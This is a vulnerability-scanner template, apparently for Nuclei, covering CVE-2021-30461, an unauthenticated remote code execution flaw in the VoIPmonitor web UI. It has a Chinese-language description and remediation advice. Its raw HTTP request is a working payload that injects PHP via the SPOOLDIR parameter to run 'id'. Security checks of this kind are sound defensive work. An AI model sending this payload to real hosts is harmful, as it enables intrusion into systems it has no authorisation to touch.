id: CVE-2021-30461
info:
  name: VoipMonitor <24.61 - Remote Code Execution
  author:
  - shifacyclewala
  - hackergautam
  tags:
  - cve
  - cve2021
  - rce
  - voipmonitor
  description: |-
    VoIPmonitor 代码注入漏洞
    VoIPmonitor是VoIPmonitor团队的一个开源网络数据包嗅探器。具有用于在 Linux 上运行的 SIP RTP RTCP SKINNY(SCCP) MGCP WebRTC VoIP 协议的商业前端。

    VoIPmonitor web UI 24.61版本之前存在安全漏洞，该漏洞源于当使用recheck选项时，用户提供的SPOOLDIR值(可能包含PHP代码)会被注入到config configuration.php中。
  reference:
  - https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
  - https://nvd.nist.gov/vuln/detail/cve-2021-30461
  - https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce
  severity: critical
  classification:
    cve-id:
    - cve-2021-30461
    cwe-id:
    - cwe-94
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.voipmonitor.org/

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
    ```
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - uid=
    - gid=
    - groups=
    - VoIPmonitor installation
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /index.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded

    SPOOLDIR=test".system(id)."&recheck=Recheck
